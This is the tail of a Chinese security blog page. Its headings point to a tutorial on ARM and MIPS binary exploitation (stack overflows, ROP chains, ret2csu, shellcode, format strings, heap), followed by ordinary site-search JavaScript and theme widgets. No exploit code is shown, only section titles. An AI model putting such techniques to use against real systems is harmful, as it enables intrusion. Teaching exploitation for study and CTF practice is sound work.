          二、ARM</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AF%84%E5%AD%98%E5%99%A8%E5%85%B3%E7%B3%BB"><span class="toc-text">
          1.寄存器关系</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4"><span class="toc-text">
          2.汇编指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%84%E5%AD%98%E5%99%A8%E4%BC%A0%E9%80%81MOV"><span class="toc-text">
          (1)寄存器传送MOV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AF%84%E5%AD%98%E5%99%A8-%E5%86%85%E5%AD%98%E4%BC%A0%E9%80%81"><span class="toc-text">
          (2)寄存器-内存传送</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0STR-LDR%E6%A8%A1%E5%BC%8F"><span class="toc-text">
          ①STR&#x2F;LDR模式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#STR-Ra-Rb-%EF%BC%9A"><span class="toc-text">
          STR Ra [Rb]：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LDR-Ra-Rb"><span class="toc-text">
          LDR Ra [Rb]</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1STM-LDM%E6%A8%A1%E5%BC%8F"><span class="toc-text">
          ②STM&#x2F;LDM模式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#STM-R0-R4-R5"><span class="toc-text">
          STM R0, {R4,R5}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="toc-text">
          (3)跳转指令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%86%E6%94%AF%E8%B7%B3%E8%BD%AC-Branch"><span class="toc-text">
          ①分支跳转(Branch)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#B"><span class="toc-text">
          B</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BX-lt-Rm-gt"><span class="toc-text">
          BX &lt;Rm&gt;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BL"><span class="toc-text">
          BL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BLX-BLR"><span class="toc-text">
          BLX&#x2F;BLR</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E6%9D%A1%E4%BB%B6%E8%B7%B3%E8%BD%AC"><span class="toc-text">
          ②条件跳转</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%9D%9E%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-text">
          2.非叶子函数溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%88%E6%A8%A1%E5%9E%8B"><span class="toc-text">
          (1)栈模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%A2%98%E7%9B%AE%EF%BC%9A"><span class="toc-text">
          (2)题目：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-text">
          (3)利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#A-%E5%90%8E%E9%97%A8"><span class="toc-text">
          A.后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#B-ROP%E9%93%BE%E6%9D%A1"><span class="toc-text">
          B.ROP链条</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="toc-text">
          🔺注意：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%A0%88%E6%A8%A1%E5%9E%8B%EF%BC%9A"><span class="toc-text">
          劫持栈模型：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E6%BA%A2%E5%87%BA%E5%AD%97%E8%8A%82%E4%B8%8D%E5%8F%97%E9%99%90%E5%88%B6"><span class="toc-text">
          A.溢出字节不受限制</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#a-%E5%AD%98%E5%9C%A8pop-r0-pc"><span class="toc-text">
          a.存在pop {r0,*, pc}</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#b-%E5%88%A9%E7%94%A8csu"><span class="toc-text">
          b.利用csu</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E6%BA%A2%E5%87%BA%E5%AD%97%E8%8A%82%E5%8F%97%E5%88%B0%E9%99%90%E5%88%B6"><span class="toc-text">
          B.溢出字节受到限制</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#a-%E5%88%A9%E7%94%A8read%E5%87%BD%E6%95%B0-shellcode"><span class="toc-text">
          a.利用read函数+shellcode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%BA%E5%AD%98%E5%9C%A8PIE%E6%97%B6"><span class="toc-text">
          🔺存在PIE时</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-text">
          3.叶子函数溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%88%E6%A8%A1%E5%9E%8B-1"><span class="toc-text">
          (1)栈模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%A2%98%E7%9B%AE%EF%BC%9A-1"><span class="toc-text">
          (2)题目：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%EF%BC%9A-1"><span class="toc-text">
          (3)利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%EF%BC%9A"><span class="toc-text">
          注：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">
          4.格式化字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%A0%86"><span class="toc-text">
          5.堆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode"><span class="toc-text">
          Shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81MIPS"><span class="toc-text">
          三、MIPS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%B5%81%E6%B0%B4%E7%BA%BF%E7%89%B9%E7%82%B9"><span class="toc-text">
          1.流水线特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%EF%BC%9A%E6%B5%81%E6%B0%B4%E7%BA%BF"><span class="toc-text">
          🔺注：流水线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%A0%88%E6%9C%BA%E5%88%B6"><span class="toc-text">
          2.栈机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-text">
          函数调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%A0%88%E5%8A%A0%E8%BD%BD"><span class="toc-text">
          函数栈加载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0"><span class="toc-text">
          叶子函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0"><span class="toc-text">
          非叶子函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E"><span class="toc-text">
          函数返回</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0-1"><span class="toc-text">
          叶子函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0-1"><span class="toc-text">
          非叶子函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">
          总结：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%AF%84%E5%AD%98%E5%99%A8%E5%85%B3%E7%B3%BB"><span class="toc-text">
          3.寄存器关系</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%8C%87%E4%BB%A4"><span class="toc-text">
          4.指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%8C%87%E4%BB%A4"><span class="toc-text">
          (1)不同类型的指令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#R%E5%9E%8B%E6%8C%87%E4%BB%A4%EF%BC%9A%E6%93%8D%E4%BD%9C%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-text">
          R型指令：操作寄存器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#I%E5%9E%8B%E6%8C%87%E4%BB%A4%EF%BC%9A%E6%93%8D%E4%BD%9C%E5%B8%B8%E9%87%8F"><span class="toc-text">
          I型指令：操作常量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J%E5%9E%8B%E6%8C%87%E4%BB%A4%EF%BC%9A%E8%B7%B3%E8%B7%83%E5%AF%BB%E5%9D%80"><span class="toc-text">
          J型指令：跳跃寻址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="toc-text">
          (2)常用指令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0load-store-%E6%8C%87%E4%BB%A4"><span class="toc-text">
          ①load&#x2F;store 指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E7%AE%97%E6%95%B0%E6%8C%87%E4%BB%A4"><span class="toc-text">
          ②算数指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2syscall"><span class="toc-text">
          ③syscall</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3%E5%88%86%E6%94%AF%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="toc-text">
          ④分支跳转指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A4%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="toc-text">
          ⑤跳转指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A5%E5%AD%90%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-text">
          ⑥子函数的调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A6%E5%AD%90%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%94%E5%9B%9E"><span class="toc-text">
          ⑦子函数的返回</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%B8%B8%E7%94%A8ROP%E5%AF%BB%E5%9D%80"><span class="toc-text">
          5.常用ROP寻址</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode%E4%B8%89%E9%83%A8%E6%9B%B2"><span class="toc-text">
          Shellcode三部曲</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-gadget1"><span class="toc-text">
          (1)gadget1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-gadget2"><span class="toc-text">
          (2)gadget2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-gadget3"><span class="toc-text">
          (3)gadget3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E5%8F%AF%E7%94%A8shellcode"><span class="toc-text">
          🔺可用shellcode:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%9B%B4%E6%8E%A5%E5%8F%AF%E7%94%A8%E7%9A%84"><span class="toc-text">
          (1)直接可用的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BB%8E%E6%A0%88%E4%B8%8A%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%EF%BC%9A"><span class="toc-text">
          (2)从栈上取数据的：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E8%B0%83%E8%AF%95"><span class="toc-text">
          6.调试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%BA%93"><span class="toc-text">
          下载库</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">133</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">83</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">73</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>